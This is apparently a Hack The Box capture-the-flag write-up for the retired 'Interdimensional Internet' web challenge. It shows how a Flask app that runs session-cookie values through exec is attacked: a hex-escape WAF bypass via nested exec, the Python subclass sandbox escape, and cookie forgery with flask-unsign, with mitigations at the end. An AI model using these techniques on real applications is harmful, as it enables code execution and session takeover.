---
challenge: Interdimensional Internet
type: Web
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [web, python, flask, exec, waf-bypass, session-cookie, sandbox-escape]
---

# Interdimensional Internet — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Challenge solved; no real flags.

## TL;DR

The "grown-up" calculator: `ingredient` and `measurements` travel inside Flask's **signed session cookie**, the `recipe` must be 20–300 characters and a WAF blocks `[`, `(`, `_` and `.`. Because the filter runs before Python interprets, the banned characters are smuggled as **hex escapes** inside a nested `exec` and the result is exfiltrated by writing it to `flask.session`, which comes back in `Set-Cookie`.

## Brief and surface

- Web, Medium, retired. Docker instance (`IP:port`).
- The description keeps the calculator joke; the source comes from `/debug`, as in the "baby" version.

## Recon

```bash
curl -s http://<IP>:<PORT>/
curl -s -i http://<IP>:<PORT>/debug | head -40
```

Submitting the form sends a Flask `session` cookie carrying both values: the app reads them from there, not from the POST. That changes the attack surface: the cookie must be **signed**, so `SECRET_KEY` is required.

## Source analysis

```python
recipe = "%s = %s" % (session['ingredient'], session['measurements'])
if not (20 <= len(recipe) <= 300):
    return "too short or too long"
if re.search(r"[\[\(\_\.]", recipe):
    return "no"
exec(recipe, garage)
```

- **20–300** characters for the whole `recipe`: the payload must fit.
- Blacklist of `[`, `(`, `_`, `.`: no attribute access, no subscripts, no calls… apparently.
- `session` is signed, not encrypted: if `SECRET_KEY` leaks (common when `app.secret_key` sits in code) it can be forged.

## The bug

The WAF validates the **string**, not the code Python ends up running. A nested `exec` passes a second string with escapes the interpreter decodes **after** the filter:

```python
exec('exec "\x5b\x28\x5f\x2e"')     # [ ( _ .
```

The filter sees `exec` and letters; Python sees the banned characters. With that, attribute access and the subclass escape chain are rebuilt:

```text
''.__class__.__mro__[2].__subclasses__()
```

The length limit forces a payload built in pieces and no wasted bytes: that is why the result is written straight into the session instead of printed.

## Local reproduction

```bash
python3 - <<'PY'
import re
recipe = 'exec(\'exec "\\x5b\\x28\\x5f\\x2e"\')'
print(len(recipe), bool(re.search(r"[\[\(\_\.]", recipe)))
PY
```

`re.search` finds nothing while `exec` does decode the escapes: the bypass premise is proven without touching the challenge.

## Exploitation

1. Obtain `SECRET_KEY` (source leaked in `/debug`, `.git`, or a weak key) and sign the cookie with `flask-unsign`:

```bash
flask-unsign --sign --cookie "{'ingredient':'x','measurements':'<PAYLOAD>'}" --secret '<SECRET_KEY>'
```

2. Send the cookie with the nested payload. Its shape is:

```text
exec('exec "<code with \\x5b \\x28 \\x5f \\x2e>"')
```

3. Exfiltrate through the session: the executed code assigns the result to `flask.session['x']`, and the response returns it in `Set-Cookie` (signed, but readable as base64).

```bash
curl -s -b "session=<COOKIE>" http://<IP>:<PORT>/ -D - -o /dev/null | grep -i set-cookie
```

4. Decode the value: Flask's cookie is `base64(zlib(json))`; with `itsdangerous` out of the way:

```bash
python3 -c "import base64,zlib;print(zlib.decompress(base64.urlsafe_b64decode('<VALUE>=='.strip('='))))"
```

The index of the `file`/`os` object in `__subclasses__()` depends on the interpreter: find it by listing and counting, never copy it blindly.

## Evidence

- Forged cookie, response with `Set-Cookie` and trimmed decoded output.
- No real flags: values live in `private/`.

## Lessons learned

- String-based WAFs are bypassed with whatever the interpreter decodes later: `\x` escapes, unicode, concatenation.
- Character counting is part of the exploit: 300 bytes force the shortest possible payload.
- `flask.session` is an excellent output channel when there is no direct response: the datum comes back to the client.
- A `SECRET_KEY` in code equals session control; the rest is Python.
- Nested `exec` (`exec('exec "..."')`) is the pattern for a second stage the filter never sees.

## Mitigations and detection

- Remove `exec`/`eval`; if computation is needed, use a restricted AST parser with an operator allowlist.
- Random `SECRET_KEY` kept out of code; rotating it invalidates forged cookies.
- Detection: `session` cookies whose payload contains `\x` or `exec`, anomalous cookie size, and 200 responses with a different `Set-Cookie` on every request.
- Log and alert on repeated syntax errors at the endpoint: an attacker iterating payloads leaves a trail.

MITRE: T1190 (exploit public-facing application), T1059.006 (Python), T1027 (obfuscated files or information), T1005 (data from local system).

## References

- <https://d4rkstat1c.medium.com/interdimensional-internet-hackthebox-writeup-5f8e5b27e3a>
- <https://7rocky.github.io/en/ctf/htb-challenges/web/baby-interdimensional-internet>
- <https://forum.hackthebox.com/t/web-interdimensional-internet/2122>
- <https://flask.palletsprojects.com/en/stable/api/#sessions>
